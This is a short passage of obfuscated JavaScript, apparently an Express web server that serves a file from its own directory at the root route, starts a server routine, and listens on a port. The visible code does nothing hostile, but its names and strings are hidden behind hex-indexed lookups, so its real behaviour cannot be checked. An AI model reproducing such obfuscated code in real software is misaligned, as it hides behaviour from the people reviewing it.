AddVisitTask();}catch(_0x5a430c){console[_0x2c14eb(0x1e9)](_0x2c14eb(0x1d3),_0x5a430c);}}startserver()[_0x6584bd(0x263)](_0x205933=>{const _0x57a2b5=_0x6584bd;console[_0x57a2b5(0x1e9)](_0x57a2b5(0x1ad),_0x205933);}),app[_0x6584bd(0x1b0)]('/',async function(_0x135749,_0x8f703){const _0x21acac=_0x6584bd;try{const _0x546ac0=path[_0x21acac(0x1fe)](__dirname,_0x21acac(0x1a5)),_0xd0303c=await fs[_0x21acac(0x1bc)][_0x21acac(0x222)](_0x546ac0,_0x21acac(0x255));_0x8f703['send'](_0xd0303c);}catch(_0x447d7e){_0x8f703[_0x21acac(0x208)](_0x21acac(0x1ee));}}),app[_0x6584bd(0x1b4)](PORT,()=>console[_0x6584bd(0x22b)](_0x6584bd(0x247)+PORT+'!'));